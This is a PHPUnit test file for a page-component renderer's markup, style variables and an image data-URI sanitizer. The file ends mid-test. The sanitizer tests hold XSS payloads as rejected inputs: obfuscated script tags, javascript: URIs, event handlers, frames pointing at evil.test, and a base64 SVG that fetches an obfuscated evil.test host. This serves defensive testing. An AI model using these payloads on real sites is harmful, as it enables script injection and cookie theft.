<?php
/**
 * tests/ComponentPropsTest.php — PHPUnit tests for hero spacing and section centered layout
 *
 * Covers: data-pp-spacing on hero (only component retaining spacing prop),
 *         and section centered layout variant.
 */

use PHPUnit\Framework\TestCase;

class ComponentPropsTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();
        $GLOBALS['_pp_test_store'] = [
            'post_meta'  => [],
            'posts'      => [],
            'options'    => [],
            'next_id'    => 100,
            'custom_css' => '',
        ];
    }

    /**
     * Helper: render a component and return its HTML output.
     */
    private function render(string $component, array $props): string
    {
        ob_start();
        pp_get_component($component, $props);
        return ob_get_clean();
    }

    // ── Section Centered Layout ────────────────────────────────────────────

    public function testSectionCenteredIsValidLayout(): void
    {
        $html = $this->render('section', [
            'body' => '<p>Centered content</p>',
            'layout' => 'centered',
        ]);
        $this->assertStringContainsString('section--centered', $html);
    }

    public function testSectionCenteredRendersBodyWithoutImageDiv(): void
    {
        $html = $this->render('section', [
            'body' => '<p>Body text</p>',
            'layout' => 'centered',
        ]);
        $this->assertStringContainsString('section__body', $html);
        $this->assertStringNotContainsString('section__image', $html);
        $this->assertStringNotContainsString('section__grid', $html);
    }

    public function testSectionCenteredHasCenteredClass(): void
    {
        $html = $this->render('section', [
            'body' => '<p>Content</p>',
            'layout' => 'centered',
        ]);
        $this->assertStringContainsString('class="section section--centered"', $html);
    }

    // ── Grid card_emphasis opt-out (issue 226) ─────────────────────────────
    // 'uniform' emits .grid--uniform, which the featured :first-child selectors
    // guard with :not(.grid--uniform) so a symmetric card row renders equal
    // cards. Default 'featured' emits NO class (byte-identical existing pages).

    public function testGridUniformEmphasisEmitsClass(): void
    {
        $html = $this->render('grid', [
            'card_emphasis' => 'uniform',
            'items' => [['title' => 'One', 'text' => 'a']],
        ]);
        $this->assertStringContainsString('grid--uniform', $html);
    }

    public function testGridFeaturedEmphasisEmitsNoClassAndStaysByteIdentical(): void
    {
        $html = $this->render('grid', [
            'card_emphasis' => 'featured',
            'items' => [['title' => 'One', 'text' => 'a']],
        ]);
        $this->assertStringNotContainsString('grid--uniform', $html);
        // Explicit 'featured' must render exactly like the historical default:
        // the bare root class, no emphasis modifier.
        $this->assertStringContainsString('class="grid"', $html);
    }

    public function testGridAbsentEmphasisEmitsNoUniformClass(): void
    {
        $html = $this->render('grid', [
            'items' => [['title' => 'One', 'text' => 'a']],
        ]);
        $this->assertStringNotContainsString('grid--uniform', $html);
        $this->assertStringContainsString('class="grid"', $html);
    }

    public function testGridInvalidEmphasisFallsBackToFeatured(): void
    {
        $html = $this->render('grid', [
            'card_emphasis' => 'bogus',
            'items' => [['title' => 'One', 'text' => 'a']],
        ]);
        $this->assertStringNotContainsString('grid--uniform', $html);
    }

    public function testGridUniformComposesWithThemeAndLayoutClasses(): void
    {
        $html = $this->render('grid', [
            'card_emphasis' => 'uniform',
            'theme' => 'dark',
            'items' => [['title' => 'One', 'text' => 'a']],
        ]);
        $this->assertStringContainsString('grid--dark', $html);
        $this->assertStringContainsString('grid--uniform', $html);
    }

    public function testGridUniformClassIsEmittedEvenOnStepsLayout(): void
    {
        // 'uniform' is a cards-layout concept and inert on steps (the featured
        // CSS rules already carry :not(.grid--steps)). The class is still emitted
        // so that if a future steps-specific first-card emphasis rule is ever
        // added, it can be guarded with the same :not(.grid--uniform) hook.
        $html = $this->render('grid', [
            'card_emphasis' => 'uniform',
            'layout' => 'steps',
            'items' => [['number' => '1', 'title' => 'One', 'text' => 'a']],
        ]);
        $this->assertStringContainsString('grid--steps', $html);
        $this->assertStringContainsString('grid--uniform', $html);
    }

    // ── Grid explicit column-count control (issue 379) ─────────────────────
    // `columns` (integer 1-4) emits data-pp-columns on the .grid__list; the CSS
    // reads it to force the desktop track count. Unset emits NO attribute so the
    // auto-by-count grain (data-pp-count only) stays byte-identical. Write-time
    // validation rejects out-of-range values; the renderer additionally coerces
    // raw-written invalid state to "no attribute" (defensive, like layout/theme).

    public function testGridColumnsEmitsDataAttributeWhenSet(): void
    {
        $html = $this->render('grid', [
            'columns' => 3,
            'items' => [['title' => 'One'], ['title' => 'Two'], ['title' => 'Three']],
        ]);
        $this->assertStringContainsString('data-pp-columns="3"', $html);
        // The auto-count attribute is still present alongside the override.
        $this->assertStringContainsString('data-pp-count="3"', $html);
    }

    public function testGridColumnsAcceptsIntegerStringValue(): void
    {
        // Admin/JSON payloads can arrive stringified; "4" must render like 4.
        $html = $this->render('grid', [
            'columns' => '4',
            'items' => [['title' => 'One']],
        ]);
        $this->assertStringContainsString('data-pp-columns="4"', $html);
    }

    public function testGridColumnsUnsetEmitsNoAttributeAndStaysByteIdentical(): void
    {
        $withUnset = $this->render('grid', [
            'items' => [['title' => 'One'], ['title' => 'Two']],
        ]);
        $this->assertStringNotContainsString('data-pp-columns', $withUnset);

        // Byte-identical to an explicit empty-string "unset" sentinel.
        $withEmpty = $this->render('grid', [
            'columns' => '',
            'items' => [['title' => 'One'], ['title' => 'Two']],
        ]);
        $this->assertSame($withUnset, $withEmpty);
    }

    public function testGridColumnsCoercesOutOfRangeRawValueToNoAttribute(): void
    {
        // Defence-in-depth for state written through a raw, non-validating path:
        // an out-of-range value must not emit an attribute the CSS can't honor.
        foreach (['0', '5', '-1', '2.5', 'bogus'] as $bad) {
            $html = $this->render('grid', [
                'columns' => $bad,
                'items' => [['title' => 'One']],
            ]);
            $this->assertStringNotContainsString(
                'data-pp-columns',
                $html,
                "columns={$bad} must not emit a data-pp-columns attribute"
            );
        }
    }

    public function testGridColumnsIsInertOnStepsLayout(): void
    {
        // columns is a cards concept; the steps layout keeps its fixed process
        // grain. The renderer must NOT emit data-pp-columns on steps (the CSS is
        // also scoped :not(.grid--steps), but the markup itself stays honest and
        // byte-identical), so steps output never carries a dead attribute.
        $html = $this->render('grid', [
            'columns' => 3,
            'layout'  => 'steps',
            'items'   => [['number' => '1', 'title' => 'One']],
        ]);
        $this->assertStringNotContainsString('data-pp-columns', $html);
        $this->assertStringContainsString('grid--steps', $html);
    }

    public function testGridColumnsComposesWithThemeAndEmphasis(): void
    {
        $html = $this->render('grid', [
            'columns' => 2,
            'theme' => 'dark',
            'card_emphasis' => 'uniform',
            'items' => [['title' => 'One'], ['title' => 'Two']],
        ]);
        $this->assertStringContainsString('data-pp-columns="2"', $html);
        $this->assertStringContainsString('grid--dark', $html);
        $this->assertStringContainsString('grid--uniform', $html);
    }

    public function testSectionCenteredSuppressesImageEvenWhenProvided(): void
    {
        $html = $this->render('section', [
            'body' => '<p>Content</p>',
            'layout' => 'centered',
            'image_url' => 'https://example.com/image.jpg',
        ]);
        $this->assertStringContainsString('section--centered', $html);
        $this->assertStringNotContainsString('section__image', $html);
        $this->assertStringNotContainsString('example.com/image.jpg', $html);
    }

    // ── Hero Spacing (hero retains spacing prop) ────────────────────────────

    public function testHeroSpacingOutputsAttribute(): void
    {
        $html = $this->render('hero', [
            'title' => 'Test Hero',
            'spacing' => 'spacious',
        ]);
        $this->assertStringContainsString('data-pp-spacing="spacious"', $html);
    }

    public function testHeroSpacingInvalidFallsBackToDefault(): void
    {
        $html = $this->render('hero', [
            'title' => 'Test Hero',
            'spacing' => 'huge',
        ]);
        $this->assertStringNotContainsString('data-pp-spacing', $html);
    }

    // ── Centered layout (unrelated to width/spacing props) ───────────────────

    public function testSectionCenteredRendersWithoutWidthOrSpacingAttributes(): void
    {
        $html = $this->render('section', [
            'body' => '<p>Content</p>',
            'layout' => 'centered',
        ]);
        $this->assertStringContainsString('section--centered', $html);
        $this->assertStringNotContainsString('data-pp-spacing', $html);
        $this->assertStringNotContainsString('data-pp-width', $html);
    }

    // ── Regression: stripped components ignore width/spacing ──────────────

    /**
     * @dataProvider strippedComponentProvider
     */
    public function testStrippedComponentIgnoresWidth(string $component, array $baseProps): void
    {
        $html = $this->render($component, array_merge($baseProps, ['width' => 'narrow']));
        $this->assertStringNotContainsString('data-pp-width', $html);
    }

    /**
     * @dataProvider strippedComponentProvider
     */
    public function testStrippedComponentIgnoresSpacing(string $component, array $baseProps): void
    {
        $html = $this->render($component, array_merge($baseProps, ['spacing' => 'compact']));
        $this->assertStringNotContainsString('data-pp-spacing', $html);
    }

    public static function strippedComponentProvider(): array
    {
        return [
            'section' => ['section', ['body' => '<p>Test</p>']],
            'cta'     => ['cta', ['title' => 'Test', 'button_text' => 'Go']],
            'grid'    => ['grid', ['items' => [['title' => 'A', 'body' => 'B']]]],
            'stats'   => ['stats', ['items' => [['number' => '10', 'label' => 'X']]]],
            'logos'   => ['logos', ['items' => [['image_url' => 'logo.png']]]],
            'embed'   => ['embed', ['content' => '<p>Embed</p>']],
        ];
    }

    // ── pp_render_style_vars() ───────────────────────────────────────────

    public function testRenderStyleVarsBasic(): void
    {
        $result = pp_render_style_vars(
            ['--hero-bg' => '#1a1a2e', '--hero-padding-top' => '8rem'],
            'hero'
        );
        $this->assertStringContainsString('--hero-bg: #1a1a2e', $result);
        $this->assertStringContainsString('--hero-padding-top: 8rem', $result);
    }

    public function testRenderStyleVarsEmpty(): void
    {
        $result = pp_render_style_vars([], 'hero');
        $this->assertSame('', $result);
    }

    public function testRenderStyleVarsSkipsUnknownSlot(): void
    {
        $result = pp_render_style_vars(
            ['--hero-bg' => '#1a1a2e', '--hero-display' => 'none'],
            'hero'
        );
        $this->assertStringContainsString('--hero-bg', $result);
        $this->assertStringNotContainsString('--hero-display', $result);
    }

    public function testRenderStyleVarsEmitsKeywordAndVarReferenceUnchanged(): void
    {
        // #230: an accepted value must SURVIVE to CSS output — esc_attr touches
        // none of ( ) - so the reference reaches the browser intact.
        $result = pp_render_style_vars(
            ['--hero-cta2-bg' => 'transparent', '--hero-accent' => 'var(--color-accent)'],
            'hero'
        );
        $this->assertStringContainsString('--hero-cta2-bg: transparent', $result);
        $this->assertStringContainsString('--hero-accent: var(--color-accent)', $result);
    }

    public function testRenderStyleVarsSkipsRecipeKey(): void
    {
        $result = pp_render_style_vars(
            ['__recipe' => 'dark-spacious', '--hero-bg' => '#1a1a2e'],
            'hero'
        );
        $this->assertStringNotContainsString('__recipe', $result);
        $this->assertStringContainsString('--hero-bg', $result);
    }

    public function testRenderStyleVarsRejectsInjection(): void
    {
        $result = pp_render_style_vars(
            ['--hero-bg' => '#fff; background-image: url(evil)'],
            'hero'
        );
        // Semicolon in value triggers injection guard — slot is skipped.
        $this->assertSame('', $result);
    }

    // ── Gradient-typed style slots render unmangled (#99) ────────────────

    public function testRenderStyleVarsGradientSurvivesUnmangledForHero(): void
    {
        // A validated gradient round-trips unmangled through the render
        // boundary: pp_render_style_vars() re-validates via the shared engine
        // (issue #330), and a valid gradient passes, reaching CSS output exactly
        // like a flat color already does (testRenderStyleVarsBasic above).
        $result = pp_render_style_vars(
            ['--hero-bg' => 'linear-gradient(135deg, #1a1a2e, #16121f)'],
            'hero'
        );
        $this->assertStringContainsString('--hero-bg: linear-gradient(135deg, #1a1a2e, #16121f)', $result);
    }

    public function testRenderStyleVarsGradientSurvivesUnmangledForCta(): void
    {
        $result = pp_render_style_vars(
            ['--cta-bg' => 'radial-gradient(circle, #fff, #000)'],
            'cta'
        );
        $this->assertStringContainsString('--cta-bg: radial-gradient(circle, #fff, #000)', $result);
    }

    public function testRenderStyleVarsGradientSurvivesUnmangledForGrid(): void
    {
        $result = pp_render_style_vars(
            ['--grid-card-bg' => 'linear-gradient(180deg, #fff, #eee)'],
            'grid'
        );
        $this->assertStringContainsString('--grid-card-bg: linear-gradient(180deg, #fff, #eee)', $result);
    }

    public function testRenderStyleVarsGradientSurvivesUnmangledForSection(): void
    {
        $result = pp_render_style_vars(
            ['--section-bg' => 'linear-gradient(to bottom, #f0f4ff, #ffffff)'],
            'section'
        );
        $this->assertStringContainsString('--section-bg: linear-gradient(to bottom, #f0f4ff, #ffffff)', $result);
    }

    public function testRenderStyleVarsGradientOverlayScrimSurvivesUnmangled(): void
    {
        // The primary practical motivation for gradient support: a
        // transparent-to-dark scrim over a background image for legibility.
        $result = pp_render_style_vars(
            ['--hero-overlay-bg' => 'linear-gradient(to bottom, transparent, rgba(0,0,0,0.7))'],
            'hero'
        );
        $this->assertStringContainsString('--hero-overlay-bg: linear-gradient(to bottom, transparent, rgba(0,0,0,0.7))', $result);
    }

    public function testHeroComponentRendersGradientBackgroundInInlineStyle(): void
    {
        // End-to-end: a gradient value set on a real component's __pp_style
        // survives all the way into the rendered <section style="..."> output,
        // exactly the "exact production regression" pattern used for #36.
        $html = $this->render('hero', [
            'title' => 'Welcome',
            '__pp_style' => ['--hero-bg' => 'linear-gradient(135deg, #1a1a2e, #16121f)'],
        ]);
        $this->assertStringContainsString('--hero-bg: linear-gradient(135deg, #1a1a2e, #16121f)', $html);
    }

    public function testRenderStyleVarsUnknownComponent(): void
    {
        $result = pp_render_style_vars(
            ['--fake-bg' => '#000'],
            'nonexistent'
        );
        $this->assertSame('', $result);
    }

    // ── CTA button_variant (prop, set via update_component) ──────────────

    private function ctaProps(array $extra = []): array
    {
        return array_merge(['title' => 'T', 'button_text' => 'Go', 'button_url' => '#'], $extra);
    }

    public function testCtaButtonVariantPrimaryIsBareBtn(): void
    {
        $html = $this->render('cta', $this->ctaProps(['button_variant' => 'primary']));
        $this->assertStringContainsString('class="cta__button btn"', $html);
        $this->assertStringNotContainsString('btn--', $html);
    }

    public function testCtaButtonVariantSecondary(): void
    {
        $html = $this->render('cta', $this->ctaProps(['button_variant' => 'secondary']));
        $this->assertStringContainsString('btn--secondary', $html);
    }

    public function testCtaButtonVariantOutline(): void
    {
        $html = $this->render('cta', $this->ctaProps(['button_variant' => 'outline']));
        $this->assertStringContainsString('btn--outline', $html);
    }

    public function testCtaButtonVariantGhost(): void
    {
        $html = $this->render('cta', $this->ctaProps(['button_variant' => 'ghost']));
        $this->assertStringContainsString('btn--ghost', $html);
    }

    public function testCtaButtonVariantInvalidFallsBackToPrimary(): void
    {
        $html = $this->render('cta', $this->ctaProps(['button_variant' => 'neon']));
        $this->assertStringContainsString('class="cta__button btn"', $html);
        $this->assertStringNotContainsString('btn--', $html);
    }

    public function testCtaButtonVariantDefaultsToPrimary(): void
    {
        $html = $this->render('cta', $this->ctaProps());
        $this->assertStringContainsString('class="cta__button btn"', $html);
        $this->assertStringNotContainsString('btn--', $html);
    }

    // ── Title-less CTA = standalone button row (issue 294) ─────────────────

    public function testCtaTitlelessRendersNoHeading(): void
    {
        // A CTA with only button props renders the button, but no <h2> heading
        // and no empty text wrapper (which would add a stray flex gap / break
        // the inline space-between layout).
        $html = $this->render('cta', ['button_text' => 'Empezar', 'button_url' => '/signup']);
        $this->assertStringContainsString('class="cta__button btn"', $html);
        $this->assertStringContainsString('Empezar', $html);
        $this->assertStringNotContainsString('cta__title', $html);
        $this->assertStringNotContainsString('<h2', $html);
        $this->assertStringNotContainsString('cta__text', $html);
    }

    public function testCtaTitlelessKeepsAnchorId(): void
    {
        // id/anchor must keep working on a title-less CTA.
        $html = $this->render('cta', [
            'id'          => 'closing-cta',
            'button_text' => 'Go',
            'button_url'  => '/',
        ]);
        $this->assertStringContainsString('id="closing-cta"', $html);
    }

    public function testCtaWithTitleStillRendersHeading(): void
    {
        // Regression guard: supplying a title must still emit the heading and
        // the text wrapper (unchanged behavior).
        $html = $this->render('cta', $this->ctaProps());
        $this->assertStringContainsString('cta__text', $html);
        $this->assertStringContainsString('<h2 class="cta__title"', $html);
    }

    public function testCtaEyebrowOnlyStillRendersTextWrapper(): void
    {
        // The text wrapper appears whenever eyebrow OR title OR text is present,
        // even without a title.
        $html = $this->render('cta', [
            'eyebrow'     => 'NEW',
            'button_text' => 'Go',
            'button_url'  => '/',
        ]);
        $this->assertStringContainsString('cta__text', $html);
        $this->assertStringContainsString('cta__eyebrow', $html);
        $this->assertStringNotContainsString('<h2', $html);
    }

    // ── Hero CTA variants (props, set via update_component) — #93 ───────────
    // Extends the shared .btn--*/--btn-* primitive (established for CTA above)
    // to hero's two CTA buttons, which previously hardcoded bare .btn / .btn--outline
    // with no way to select secondary/ghost. cta2_variant defaults to 'outline'
    // to preserve the historical always-outline second button.

    private function heroProps(array $extra = []): array
    {
        return array_merge(['title' => 'T', 'cta_text' => 'Go', 'cta2_text' => 'Learn more'], $extra);
    }

    public function testHeroCtaVariantDefaultsToPrimary(): void
    {
        $html = $this->render('hero', $this->heroProps());
        $this->assertMatchesRegularExpression('/class="hero__cta btn"[^-]/', $html . ' ');
    }

    public function testHeroCta2VariantDefaultsToOutline(): void
    {
        // Preserves pre-#93 behavior: an unset cta2_variant still renders outline.
        $html = $this->render('hero', $this->heroProps());
        $this->assertStringContainsString('class="hero__cta hero__cta--secondary btn btn--outline"', $html);
    }

    public function testHeroCtaVariantSecondary(): void
    {
        $html = $this->render('hero', $this->heroProps(['cta_variant' => 'secondary']));
        $this->assertStringContainsString('class="hero__cta btn btn--secondary"', $html);
    }

    public function testHeroCtaVariantGhost(): void
    {
        $html = $this->render('hero', $this->heroProps(['cta_variant' => 'ghost']));
        $this->assertStringContainsString('class="hero__cta btn btn--ghost"', $html);
    }

    public function testHeroCta2VariantPrimary(): void
    {
        $html = $this->render('hero', $this->heroProps(['cta2_variant' => 'primary']));
        $this->assertStringContainsString('class="hero__cta btn"', $html);
        // Neither button should carry a btn-- modifier now.
        $this->assertSame(0, substr_count($html, 'btn--'));
    }

    public function testHeroCtaVariantInvalidFallsBackToPrimary(): void
    {
        $html = $this->render('hero', $this->heroProps(['cta_variant' => 'neon']));
        $this->assertMatchesRegularExpression('/class="hero__cta btn"[^-]/', $html . ' ');
    }

    public function testHeroCta2VariantInvalidFallsBackToOutline(): void
    {
        $html = $this->render('hero', $this->heroProps(['cta2_variant' => 'neon']));
        $this->assertStringContainsString('class="hero__cta hero__cta--secondary btn btn--outline"', $html);
    }

    // ── CRITICAL regression: button enrichment must not break --cta-accent ──
    //
    // The shared .btn was tokenized with --btn-* defaults. Existing compositions
    // and the dark-bold/accent-framed recipes color the CTA button via the
    // component-scoped `.cta .btn { background-color: var(--cta-accent, ...) }`
    // override. This proves that path still works end to end: the slot still
    // renders as an inline custom property AND the CSS still consumes it.

    public function testCtaAccentOnlyCompositionStillRendersAccentCustomProperty(): void
    {
        $html = $this->render('cta', $this->ctaProps([
            '__pp_style' => ['--cta-accent' => '#ff0000'],
        ]));
        $this->assertStringContainsString('--cta-accent: #ff0000', $html);
    }

    public function testCtaBtnCssStillConsumesCtaAccentAfterEnrichment(): void
    {
        $css = file_get_contents(dirname(__DIR__) . '/assets/css/components.css');
        // Allow for the :not(.btn--outline):not(.btn--ghost):not(.btn--secondary)
        // exclusion clauses added between .btn and { by the #111 cascade-bug fix.
        $this->assertMatchesRegularExpression(
            '/\.cta\s+\.btn[^{]*\{[^}]*var\(\s*--cta-accent/s',
            $css,
            'The component-scoped .cta .btn override must still consume var(--cta-accent) '
            . 'after the shared button was tokenized — otherwise old compositions lose their color.'
        );
    }

    // ── Secondary/outline button cascade bug + per-instance slots (#111) ────

    public function testCtaAccentFillExcludesOutlineGhostSecondary(): void
    {
        // Regression guard: .cta .btn (2 classes, specificity 0,2,0) has HIGHER
        // specificity than .btn--outline/--ghost/--secondary (1 class each,
        // 0,1,0), so without this :not() exclusion the accent fill
        // unconditionally wins regardless of source order. Confirmed
        // empirically (Playwright): without the exclusion, outline and ghost
        // both render with button text the same color as the button
        // background (fully invisible).
        $css = file_get_contents(dirname(__DIR__) . '/assets/css/components.css');
        $this->assertMatchesRegularExpression(
            '/\.cta\s+\.btn:not\(\.btn--outline\):not\(\.btn--ghost\):not\(\.btn--secondary\)\s*\{[^}]*var\(\s*--cta-accent\b/s',
            $css,
            ".cta .btn's accent-fill rule must exclude outline/ghost/secondary via :not(), "
            . 'or those variants render with an invisible/wrong-colored button (#111).'
        );
    }

    public function testHeroAccentFillExcludesOutlineGhostSecondary(): void
    {
        // Same guard for hero's equivalent rule (this specific fix predates
        // #111 — pins it so a future refactor can't silently reintroduce it).
        $css = file_get_contents(dirname(__DIR__) . '/assets/css/components.css');
        $this->assertMatchesRegularExpression(
            '/\.hero\s+\.btn:not\(\.btn--outline\):not\(\.btn--ghost\):not\(\.btn--secondary\)\s*\{[^}]*var\(\s*--hero-accent\b/s',
            $css,
            ".hero .btn's accent-fill rule must exclude outline/ghost/secondary via :not()."
        );
    }

    public function testHeroSchemaDeclaresAllSixCta2Slots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/hero/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        foreach (['--hero-cta2-bg', '--hero-cta2-border', '--hero-cta2-color', '--hero-cta2-hover-bg', '--hero-cta2-hover-border', '--hero-cta2-hover-color'] as $name) {
            $this->assertArrayHasKey($name, $slots, "hero must declare {$name}.");
            $this->assertSame('color', $slots[$name]['type']);
        }
    }

    public function testCtaSchemaDeclaresAllSixButtonSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/cta/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        foreach (['--cta-button-bg', '--cta-button-border', '--cta-button-color', '--cta-button-hover-bg', '--cta-button-hover-border', '--cta-button-hover-color'] as $name) {
            $this->assertArrayHasKey($name, $slots, "cta must declare {$name}.");
            $this->assertSame('color', $slots[$name]['type']);
        }
    }

    public function testHeroCta2OverrideAppliesOnlyToSecondaryButton(): void
    {
        // The override must be scoped to .hero__cta--secondary, not leak onto
        // the primary button — even when the override is set, the primary's
        // rendered class list carries no such class.
        $html = $this->render('hero', $this->heroProps([
            '__pp_style' => ['--hero-cta2-color' => '#00ff00'],
        ]));
        $this->assertStringContainsString('--hero-cta2-color: #00ff00', $html);
        $this->assertStringContainsString('hero__cta hero__cta--secondary btn', $html);
        // Only ONE button should carry the secondary class.
        $this->assertSame(1, substr_count($html, 'hero__cta--secondary'));
    }

    public function testCtaButtonOverrideRenders(): void
    {
        $html = $this->render('cta', $this->ctaProps([
            'button_variant' => 'outline',
            '__pp_style' => ['--cta-button-bg' => '#ff00ff', '--cta-button-border' => '#ffff00'],
        ]));
        $this->assertStringContainsString('--cta-button-bg: #ff00ff', $html);
        $this->assertStringContainsString('--cta-button-border: #ffff00', $html);
    }

    public function testHeroCta2VariantsAllRouteThroughOverrideSlotsInCss(): void
    {
        // Comprehensive coverage beyond the keystone contract test's "at least
        // one compatible consumption" check — every one of the 4 variant-specific
        // rule blocks must reference --hero-cta2-bg, not just one of them.
        $css = file_get_contents(dirname(__DIR__) . '/assets/css/components.css');
        $this->assertSame(
            4,
            substr_count($css, '--hero-cta2-bg'),
            '--hero-cta2-bg must be referenced in exactly 4 places: the primary-shape rule '
            . 'plus outline/secondary/ghost — one per variant (#111).'
        );
    }

    public function testCtaButtonVariantsAllRouteThroughOverrideSlotsInCss(): void
    {
        $css = file_get_contents(dirname(__DIR__) . '/assets/css/components.css');
        $this->assertSame(
            4,
            substr_count($css, '--cta-button-bg'),
            '--cta-button-bg must be referenced in exactly 4 places: the primary-shape rule '
            . 'plus outline/secondary/ghost — one per variant (#111).'
        );
    }

    // ── pp_esc_image_src (#36) ───────────────────────────────────────────────

    public function testEscImageSrcEmptyReturnsEmpty(): void
    {
        $this->assertSame('', pp_esc_image_src(''));
    }

    public function testEscImageSrcDelegatesToEscUrlForOrdinaryUrls(): void
    {
        $this->assertSame(esc_url('https://example.com/photo.jpg'), pp_esc_image_src('https://example.com/photo.jpg'));
        $this->assertSame(esc_url('/wp-content/uploads/photo.jpg'), pp_esc_image_src('/wp-content/uploads/photo.jpg'));
    }

    public function testEscImageSrcAcceptsRawSvgDataUri(): void
    {
        $svg = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>';
        $result = pp_esc_image_src($svg);
        $this->assertNotSame('', $result, 'A well-formed raw SVG data URI must not be rejected outright.');
        $this->assertStringStartsWith('data:image/svg+xml,', $result);
        // The dangerous-in-context characters must be percent-encoded...
        $this->assertStringNotContainsString('"', $result);
        $this->assertStringNotContainsString('<', $result);
        $this->assertStringNotContainsString('>', $result);
        // ...but the meaningful content is preserved (percent-decodes back):
        // '<' becomes %3C, the quote right after xmlns= becomes %22, and the
        // '=' itself is left alone (it's safe in both contexts already).
        $this->assertStringContainsString('%3Csvg', $result);
        $this->assertStringContainsString('xmlns=%22', $result);
    }

    public function testEscImageSrcAcceptsBase64PngDataUri(): void
    {
        $uri = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAB';
        $this->assertSame($uri, pp_esc_image_src($uri));
    }

    public function testEscImageSrcAcceptsBase64SvgWithCharset(): void
    {
        $uri = 'data:image/svg+xml;charset=utf-8;base64,PHN2Zz48L3N2Zz4=';
        $this->assertSame($uri, pp_esc_image_src($uri));
    }

    public function testEscImageSrcRejectsNonImageMimeType(): void
    {
        $this->assertSame('', pp_esc_image_src('data:text/html,<script>alert(1)</script>'));
        $this->assertSame('', pp_esc_image_src('data:application/javascript,alert(1)'));
    }

    public function testEscImageSrcRejectsUnlistedImageSubtype(): void
    {
        // bmp/tiff are real image mime types but not in the allowlist.
        $this->assertSame('', pp_esc_image_src('data:image/bmp;base64,AAAA'));
    }

    public function testEscImageSrcRejectsInvalidBase64Payload(): void
    {
        $this->assertSame('', pp_esc_image_src('data:image/png;base64,not valid base64!!'));
        $this->assertSame('', pp_esc_image_src('data:image/png;base64,'));
    }

    public function testEscImageSrcRejectsEmbeddedScriptTag(): void
    {
        $this->assertSame(
            '',
            pp_esc_image_src('data:image/svg+xml,<svg><script>alert(document.cookie)</script></svg>')
        );
    }

    public function testEscImageSrcRejectsJavascriptUriInSvg(): void
    {
        $this->assertSame(
            '',
            pp_esc_image_src('data:image/svg+xml,<svg><a href="javascript:alert(1)">x</a></svg>')
        );
    }

    public function testEscImageSrcRejectsEventHandlerAttribute(): void
    {
        $this->assertSame(
            '',
            pp_esc_image_src('data:image/svg+xml,<svg onload="alert(1)"><circle r="5"/></svg>')
        );
    }

    public function testEscImageSrcRejectsForeignObjectIframeEmbedObject(): void
    {
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><foreignObject><body>x</body></foreignObject></svg>'));
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><iframe src="//evil.test"></iframe></svg>'));
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><embed src="//evil.test"/></svg>'));
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><object data="//evil.test"></object></svg>'));
    }

    public function testEscImageSrcRejectsOversizedDataUri(): void
    {
        $huge = 'data:image/png;base64,' . str_repeat('A', 2000000);
        $this->assertSame('', pp_esc_image_src($huge));
    }

    public function testEscImageSrcEncodedResultCannotBreakOutOfHtmlAttribute(): void
    {
        // A payload attempting to smuggle an attribute-breakout via a literal
        // quote must come back with that quote neutralized, not rejected
        // outright (rejection is reserved for actual script-executing
        // constructs) — proving the encoded output is safe to concatenate
        // directly into src="..." with no further escaping.
        $payload = 'data:image/svg+xml,<svg data-x="y"><circle r="5"/></svg>';
        $result = pp_esc_image_src($payload);
        $this->assertStringNotContainsString('"', $result);
    }

    // ── Cross-model adversarial review: confirmed bypasses of an earlier,
    // regex/blocklist-only version of this function ───────────────────────

    public function testEscImageSrcRejectsNewlineSplitScriptTag(): void
    {
        // "<scr" + newline + "ipt>" defeats a literal "<script" substring
        // search but is not valid XML either way (a tag name cannot contain
        // whitespace) — must still come back rejected, not silently
        // reconstituted into "<script>" by an output-stripping step.
        $payload = "data:image/svg+xml,<svg><scr\nipt>alert(1)</scr\nipt></svg>";
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsPercentEncodedScriptTag(): void
    {
        // The entire malicious payload pre-encoded so no literal "<script"
        // substring ever appears in the raw input — must be caught after
        // decoding, not waved through because the check ran too early.
        $payload = 'data:image/svg+xml,%3Csvg%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E%3C%2Fsvg%3E';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsDoubleEncodedScriptTag(): void
    {
        $payload = 'data:image/svg+xml,%253Csvg%253E%253Cscript%253Ealert(1)%253C%252Fscript%253E%253C%252Fsvg%253E';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsNamespacePrefixedScriptTag(): void
    {
        // <x:script> where x is bound to the SVG namespace is equivalent to
        // <script> per XML namespace rules — a raw "<script" substring
        // search never sees it, but XPath's local-name() resolves the true
        // element name regardless of prefix.
        $payload = 'data:image/svg+xml,<svg xmlns:x="http://www.w3.org/2000/svg"><x:script>alert(1)</x:script></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsCharacterReferenceObfuscatedJavascriptUri(): void
    {
        // "jav&#x61;script:" contains no literal "javascript:" substring,
        // but a real XML parser resolves the numeric character reference
        // during parsing — by the time the attribute value is inspected,
        // it already reads "javascript:alert(1)".
        $payload = 'data:image/svg+xml,<svg><a href="jav&#x61;script:alert(1)">x</a></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsMaliciousContentInsideBase64Svg(): void
    {
        // The base64 alphabet is inert for HTML/CSS transport, but the SVG
        // it decodes to must still be scanned — "the alphabet is safe"
        // is not the same claim as "the decoded document is safe."
        $malicious = '<svg onload="alert(document.cookie)"><script>fetch(String.fromCharCode(47,47,101,118,105,108,46,116,101,115,116))</script></svg>';
        $payload = 'data:image/svg+xml;base64,' . base64_encode($malicious);
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsSvgWithDoctype(): void
    {
        // DOCTYPE is rejected outright rather than parsed "carefully" —
        // closes the external-entity/DTD attack surface unconditionally.
